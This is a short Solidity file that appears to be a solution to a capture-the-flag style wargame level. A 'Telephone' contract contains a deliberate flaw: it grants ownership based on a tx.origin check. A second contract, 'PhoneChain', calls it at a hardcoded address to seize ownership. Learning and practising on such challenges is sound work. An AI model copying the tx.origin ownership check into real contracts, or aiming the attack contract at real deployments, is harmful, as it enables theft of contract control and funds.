// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    // change the owner based on tx.origin
    // we can spoof this
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract PhoneChain {
  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function claimOwnership() payable public{
    Telephone(0x9F728A9a2B2c6AC2A008F828086DB24FF5e5fA9d).changeOwner(owner);
  }
}
